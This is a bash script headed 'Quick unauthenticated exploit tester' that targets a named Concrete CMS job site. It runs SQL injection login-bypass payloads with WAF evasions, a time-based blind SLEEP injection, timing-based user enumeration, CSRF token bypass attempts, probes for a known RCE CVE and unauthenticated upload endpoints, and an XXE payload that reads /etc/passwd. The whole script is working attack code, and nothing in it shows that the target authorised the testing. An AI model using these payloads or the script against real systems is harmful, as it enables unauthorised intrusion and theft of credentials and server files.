#!/bin/bash
# Quick unauthenticated exploit tester

TARGET="https://jobs.dnv.com"

echo "=== UNAUTHENTICATED EXPLOIT TESTING ==="

# Get fresh token
echo -e "\n[*] Getting CSRF token..."
TOKEN=$(curl -c /tmp/unauth_cookies.txt -s "${TARGET}/index.php?cID=156%00" | grep -oP 'name="ccm_token" value="\K[^"]+')
echo "Token: $TOKEN"

# 1. Test SQL injection with various bypass techniques
echo -e "\n[1] Testing SQL Injection with WAF bypasses..."

SQLI_PAYLOADS=(
    "admin'--"
    "admin%27--"
    "admin' oR '1'='1"
    "admin'||'1'='1"
    "admin' /*!50000OR*/ '1'='1"
)

for payload in "${SQLI_PAYLOADS[@]}"; do
    echo -e "\n  Payload: $payload"
    RESPONSE=$(curl -b /tmp/unauth_cookies.txt -s \
        -X POST "${TARGET}/login/authenticate/concrete" \
        -H "Referer: ${TARGET}/index.php/login" \
        -H "Origin: ${TARGET}" \
        -d "uName=${payload}&uPassword=test&ccm_token=${TOKEN}" \
        -L -w "\n__HTTP__:%{http_code}" 2>&1)

    HTTP=$(echo "$RESPONSE" | grep "__HTTP__" | cut -d: -f2)
    ERROR_MSG=$(echo "$RESPONSE" | grep -i -E "error|invalid|sql|syntax|mysql" | head -1)

    echo "    HTTP: $HTTP"
    [ ! -z "$ERROR_MSG" ] && echo "    Error: $ERROR_MSG"

    # Check if response contains dashboard (successful login)
    if echo "$RESPONSE" | grep -q "ccm-dashboard\|dashboard"; then
        echo "    ⚠️ POTENTIAL SQLi BYPASS! Response contains dashboard"
    fi
done

# 2. Time-based SQL injection
echo -e "\n[2] Testing time-based blind SQL injection..."
echo "  Testing normal request (baseline)..."
START=$(date +%s)
curl -b /tmp/unauth_cookies.txt -s -o /dev/null \
    -X POST "${TARGET}/login/authenticate/concrete" \
    -d "uName=testuser&uPassword=test&ccm_token=${TOKEN}"
END=$(date +%s)
NORMAL_TIME=$((END - START))
echo "  Baseline time: ${NORMAL_TIME}s"

echo "  Testing with SLEEP(5) payload..."
START=$(date +%s)
curl -b /tmp/unauth_cookies.txt -s -o /dev/null \
    -X POST "${TARGET}/login/authenticate/concrete" \
    -d "uName=admin' AND SLEEP(5)-- -&uPassword=test&ccm_token=${TOKEN}"
END=$(date +%s)
SLEEP_TIME=$((END - START))
echo "  Sleep payload time: ${SLEEP_TIME}s"

if [ $SLEEP_TIME -ge $((NORMAL_TIME + 4)) ]; then
    echo "  ⚠️ POTENTIAL TIME-BASED SQLi! Response delayed by $((SLEEP_TIME - NORMAL_TIME))s"
fi

# 3. User enumeration via timing
echo -e "\n[3] Testing user enumeration via timing attack..."
for user in "nonexistent987654321" "admin" "administrator"; do
    START=$(date +%s%N)
    curl -b /tmp/unauth_cookies.txt -s -o /dev/null \
        -X POST "${TARGET}/login/authenticate/concrete" \
        -d "uName=${user}&uPassword=wrongpass123&ccm_token=${TOKEN}"
    END=$(date +%s%N)
    TIME=$(((END - START) / 1000000))  # Convert to ms
    echo "  User '$user': ${TIME}ms"
done

# 4. CSRF token bypass
echo -e "\n[4] Testing CSRF token bypass..."
echo "  Attempt 1: No token"
curl -s -w "HTTP: %{http_code}\n" \
    -X POST "${TARGET}/login/authenticate/concrete" \
    -d "uName=admin&uPassword=test" | grep -i "error\|invalid\|token\|HTTP" | head -2

echo "  Attempt 2: Empty token"
curl -s -w "HTTP: %{http_code}\n" \
    -X POST "${TARGET}/login/authenticate/concrete" \
    -d "uName=admin&uPassword=test&ccm_token=" | grep -i "error\|invalid\|token\|HTTP" | head -2

# 5. External form endpoints (potential RCE)
echo -e "\n[5] Checking external form endpoints (CVE-2021-40098 - RCE)..."
curl -s -o /dev/null -w "  add_external: HTTP %{http_code}\n" \
    "${TARGET}/index.php/dashboard/reports/forms/add_external%00"

curl -s -o /dev/null -w "  submit_external: HTTP %{http_code}\n" \
    "${TARGET}/index.php/tools/required/forms/submit_external%00"

curl -s -o /dev/null -w "  forms (no %00): HTTP %{http_code}\n" \
    "${TARGET}/index.php/dashboard/reports/forms"

# 6. File upload endpoints (unauthenticated)
echo -e "\n[6] Checking for unauthenticated file upload..."
curl -s -o /dev/null -w "  upload: HTTP %{http_code}\n" \
    "${TARGET}/index.php/ccm/system/file/upload%00"

curl -s -o /dev/null -w "  upload_complete: HTTP %{http_code}\n" \
    "${TARGET}/index.php/ccm/system/dialogs/file/upload_complete%00"

# 7. XXE testing
echo -e "\n[7] Testing XXE vulnerabilities..."
XXE_PAYLOAD='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

curl -s "${TARGET}/index.php/ccm/api/v1%00" \
    -H "Content-Type: application/xml" \
    -d "$XXE_PAYLOAD" \
    -w "\n  HTTP: %{http_code}\n" | grep -i -E "root:|HTTP:" | head -3

echo -e "\n=== TESTING COMPLETE ==="
